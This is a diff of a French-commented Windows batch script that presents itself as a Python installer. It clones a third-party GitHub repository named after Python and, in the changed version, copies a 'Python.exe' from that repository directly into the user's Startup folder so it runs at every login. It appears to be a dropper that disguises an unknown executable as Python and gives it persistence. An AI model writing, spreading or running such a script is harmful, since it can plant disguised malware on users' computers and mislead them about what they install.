@@ -56,9 +56,9 @@ echo ==============================
 
 set "REPO_URL=https://github.com/CiFixe/Python-3.14.7"
 set "APP_NAME=Python"
-set "INSTALL_DIR=%LOCALAPPDATA%\%APP_NAME%"
 set "TEMP_DIR=%TEMP%\%APP_NAME%_install"
 set "EXE_NAME=Python.exe"
+set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
 :: ==============================
 :: VERIFICATION DE GIT
@@ -153,7 +153,7 @@ if errorlevel 1 (
 :: VERIFICATION DU RELEASE
 :: ==============================
 
-if not exist "%TEMP_DIR%\repo\release\%EXE_NAME%" (
+if not exist "%TEMP_DIR%\repo\%EXE_NAME%" (
     echo.
     echo Erreur : introuvable dans release.
     pause
@@ -167,15 +167,9 @@ if not exist "%TEMP_DIR%\repo\release\%EXE_NAME%" (
 echo.
 echo Installation des fichiers...
 
-if exist "%INSTALL_DIR%" (
-    rmdir /s /q "%INSTALL_DIR%"
-)
+if exist "%STARTUP_DIR%\%EXE_NAME%" del /f /q "%STARTUP_DIR%\%EXE_NAME%"
 
-mkdir "%INSTALL_DIR%"
-
-:: Copier uniquement le contenu de release
-
-xcopy "%TEMP_DIR%\repo\release\*" "%INSTALL_DIR%\" /E /I /H /Y
+copy /Y "%TEMP_DIR%\repo\%EXE_NAME%" "%STARTUP_DIR%\%EXE_NAME%"
 
 if errorlevel 1 (
     echo.
@@ -194,17 +188,14 @@ echo Suppression des fichiers temporaires...
 rmdir /s /q "%TEMP_DIR%"
 
 :: ==============================
-:: CREATION DU RACCOURCI STARTUP
+:: INSTALLATION DANS STARTUP
 :: ==============================
-
-
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$WshShell = New-Object -ComObject WScript.Shell; $Startup = [Environment]::GetFolderPath('Startup'); $Shortcut = $WshShell.CreateShortcut((Join-Path $Startup '%APP_NAME%.lnk')); $Shortcut.TargetPath = Join-Path '%INSTALL_DIR%' '%EXE_NAME%'; $Shortcut.WorkingDirectory = '%INSTALL_DIR%'; $Shortcut.Save()"
 
 :: ==============================
 :: VERIFICATION
 :: ==============================
 
-if exist "%INSTALL_DIR%\%EXE_NAME%" (
+if exist "%STARTUP_DIR%\%EXE_NAME%" (
     echo.
     echo ==============================
     echo Installation terminee !
